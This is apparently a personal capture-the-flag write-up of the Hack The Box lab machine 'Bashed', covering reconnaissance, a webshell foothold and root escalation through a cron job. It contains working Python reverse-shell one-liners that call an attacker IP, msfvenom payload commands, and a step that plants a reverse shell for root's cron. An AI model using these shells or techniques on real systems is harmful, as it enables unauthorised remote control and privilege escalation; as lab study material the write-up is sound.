---
tags:
  - HTB
  - Retired
  - Linux
  - Python
  - sudo
  - webshell
creation date: 2018-09-29
Date Completed: 2024-10-12
CVEs: CVE-2017-16695
URL: https://app.hackthebox.com/machines/Bashed
IP: 10.129.213.72
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

```

### ffuf (Directories/Subdomain/Files)
```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt:FUZZ -u $URL/FUZZ -c
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u $URL/FUZZ -c
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u $URL -H "HOST: FUZZ.domain.htb" -c
```

`-recursion -recursion-depth 1`

When raft fails
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u $URL/FUZZ -c
```
### Nikto (Identify Technology)

```
nikto -h $URL -C all
```

## Autorecon

http://10.129.213.72/dev/phpbash.php

# Foothold

users:
arrexel
scriptmanager

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.15.64",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```


# Enumeration as www-data

![[Pasted image 20241012095358.png]]


## Linpeas

~~CVE-2016-8655 ~~https://www.exploit-db.com/exploits/44696
~~CVE-2018-14665~~ https://www.exploit-db.com/exploits/45742
**CVE-2017-16695 https://www.exploit-db.com/exploits/45058** 
Vulnerable sudo version https://www.exploit-db.com/exploits/51217

/var/www/html/config.php
/var/www/html/uploads
/usr/bin/gettext.sh
/.bash_history

/etc/apache2/sites-available/000-default.conf
/etc/php/7.0/apache2/php.ini
/etc/php/7.0/cli/php.ini
/etc/apache2/sites-enabled/000-default.conf

unmounted file system
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

sda
sda1
sda2
sda5

Linux version 4.4.0

## pspy

![[Pasted image 20241012102936.png]]


## Get a better shell
```
msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=10.10.15.64 lport=31337 -f elf > s
```


# Priv Esc

**CVE-2017-16695** https://www.exploit-db.com/exploits/45058

I bet there's other ways...

Looks like the sudo exploit and kernel exploit may have also worked
https://www.exploit-db.com/exploits/51217
https://www.exploit-db.com/exploits/44298

however, i really feel like all those are unintended. there is that cron job running as root that exploits all python scripts in the /scripts folder. only scriptmanager has access to that folder. i feel like the intended path was for me to pivot to scriptmanager and then abuse that cron job. but also scriptmanager can run all commands without a password... OMG i just realized I completely misunderstood the sudo -l output....... fuuuu i'm so silly... i'm going back in to do this the intended way.....




```
sudo -u scriptmanager echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.15.64",8008));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'" > pe.py

sudo -u scriptmanager cp pe.py /scripts
```
Then just wait for the cron job to run...

omg... learned something new here :(
 ` sudo -u scriptmanager bash -i ` will spawn a bash shell and give full read/write access to /scripts


python reverse shell
```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.15.64 LPORT=8008 -f raw > reverse.py
```

none of my python reverse shells are working. i literally tried very one on revshells, plus a random one i found on github, plus the msfvenom one...............

from https://0xdf.gitlab.io/2018/04/29/htb-bashed.html#shell-upgrade
```
 echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.64\",8008));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > exploit.py
```

so why did that work..... wtf....

so i found that reverse shell here https://medium.com/dont-code-me-on-that/bunch-of-shells-python-b3fb1400b823

the article implies its from payloadallthethings but i didn't see it there....